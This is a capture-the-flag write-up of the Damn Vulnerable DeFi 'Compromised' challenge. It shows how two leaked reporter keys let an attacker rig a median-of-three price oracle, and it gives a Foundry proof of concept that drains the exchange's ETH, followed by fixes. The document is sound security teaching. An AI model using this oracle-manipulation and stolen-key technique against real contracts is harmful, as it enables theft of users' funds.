# Compromised — Two Leaked Keys, One Rigged Oracle

**Challenge:** Damn Vulnerable DeFi v4 — Compromised
**Category:** Oracle Manipulation / Compromised Trusted Sources
**Severity:** Critical (the exchange's entire ETH balance is drained)

## What's going on

An exchange sells NFTs at a price read from an on-chain oracle. The oracle has three
trusted reporters and uses the **median** of their prices. The exchange holds 999 ETH,
and the player starts with 0.1 ETH. The goal is to move all of the exchange's ETH to a
recovery account, leaving the NFT price unchanged at the end.

The starting point is not in the contracts. A web service returned a strange response
containing two blobs of hex.

## The leak

Each hex blob is ASCII text. Decoding the hex gives a base64 string, and decoding that
gives a 32-byte private key (66 characters with the `0x` prefix):

```bash
echo "<hex blob>" | xxd -r -p | base64 -d
```

`cast wallet address --private-key <key>` shows that the two keys belong to two of the
three trusted price reporters. Two of three is a majority.

## The bug

`TrustfulOracle` returns the median of the sources' prices, so whoever controls a
majority of the sources controls the price:

```solidity
uint256[] memory prices = getAllPricesForSymbol(symbol);
LibSort.insertionSort(prices);
// odd length: the middle element
return prices[prices.length / 2];
```

With three sources, setting two of them to the same value makes that value the median.
Nothing limits how far a source can move the price in one update, and prices take effect
immediately.

`Exchange` reads the live price on every trade:

```solidity
uint256 price = oracle.getMedianPrice(token.symbol());
```

So the price can be changed between a buy and a sell in the same transaction, and the
exchange pays out whatever it reads at the moment of the sale.

## The attack

1. Using the two compromised reporters, post a price of 0. The median becomes 0.
2. Buy one NFT with 1 wei. `buyOne` rejects a payment of exactly 0, and refunds the
   unused amount.
3. Post a price equal to the exchange's whole ETH balance. The median becomes 999 ETH.
4. Approve the exchange and sell the NFT back. The exchange pays out its entire balance.
5. Post the original price (999 ETH) again from both reporters, so the final oracle
   state is unchanged.
6. Send the proceeds to the recovery account.

## PoC

```solidity
function test_compromised() public checkSolved {
    address source1 = vm.addr(pk1); // pk1, pk2: the two decoded keys
    address source2 = vm.addr(pk2);

    _setPrice(source1, 0);
    _setPrice(source2, 0);

    vm.startPrank(player);
    uint256 id = exchange.buyOne{value: 1 wei}();
    vm.stopPrank();

    uint256 pumped = address(exchange).balance;
    _setPrice(source1, pumped);
    _setPrice(source2, pumped);

    vm.startPrank(player);
    nft.approve(address(exchange), id);
    exchange.sellOne(id);
    vm.stopPrank();

    _setPrice(source1, INITIAL_NFT_PRICE);
    _setPrice(source2, INITIAL_NFT_PRICE);

    vm.startPrank(player);
    (bool ok,) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
    require(ok, "transfer to recovery failed");
    vm.stopPrank();
}

function _setPrice(address source, uint256 price) private {
    vm.prank(source);
    oracle.postPrice("DVNFT", price);
}
```

Full test file: `test/compromised/Compromised.t.sol`

## Why I'm calling this Critical

- **Total loss of the exchange's funds.** All 999 ETH is taken.
- **Cheap to exploit.** The player needs 1 wei and two keys that were handed out by a
  server response.
- **Instant and repeatable.** There is no delay, TWAP or price bound, so the price can
  swing from 0 to the full balance and back inside one transaction.
- **Root cause is shared.** The key leak is an operational failure, but the contracts
  also give a two-key compromise unlimited power over the price.

## Fix

- Do not rely on a median of three where two keys decide the result. Use more sources,
  a larger quorum, or an aggregation that tolerates compromised reporters.
- Limit how fast the price can move: per-update change caps, a time delay, or a TWAP,
  so a price cannot go from 0 to 999 ETH in one block.
- Add sanity checks in the exchange, such as refusing trades when the price deviates
  too far from its recent history, and cap the payout per sale.
- Treat the reporter keys as high-value secrets: keep them in HSMs or multisigs, never
  in anything a web service can return.

## Takeaway

For any oracle, count how many sources an attacker needs to control to set its output,
and compare that to how those sources are secured. Then check whether the consumer can
be tricked by a price that changes within the same transaction. A trusted-source oracle
is only as strong as the weakest majority of its keys.
